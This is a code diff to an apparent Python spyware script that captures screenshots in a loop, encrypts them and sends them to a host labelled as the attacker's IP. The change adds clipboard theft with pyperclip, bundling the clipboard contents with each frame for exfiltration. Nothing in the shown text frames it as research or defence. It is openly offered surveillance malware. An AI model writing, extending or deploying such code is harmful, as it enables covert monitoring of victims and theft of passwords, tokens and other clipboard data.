@@ -5,6 +5,7 @@ import cv2
 import mss
 import numpy as np
 from cryptography.fernet import Fernet
+import pyperclip
 
 # Attacker's IP and Port
 HOST = PLACEHOLDER_IP
@@ -27,9 +28,16 @@ while True:
     frame = np.array(screenshot)  # Convert to NumPy array
     frame = cv2.resize(frame, (800, 450))  # Resize
 
-    # Serialize and encrypt the frame directly
-    data = pickle.dumps(frame)  # Serialize raw frame
-    encrypted_data = cipher.encrypt(data)  # Encrypt
+    clipboard = pyperclip.paste()  # Get clipboard content
+
+    # Serialize both frame and clipboard together
+    data = {
+        "frame": frame,
+        "clipboard": clipboard
+    }
+
+    serialized_data = pickle.dumps(data)  # Ensure serialization to bytes
+    encrypted_data = cipher.encrypt(serialized_data)  # Encrypt serialized data
 
     message = struct.pack("Q", len(encrypted_data)) + encrypted_data
 
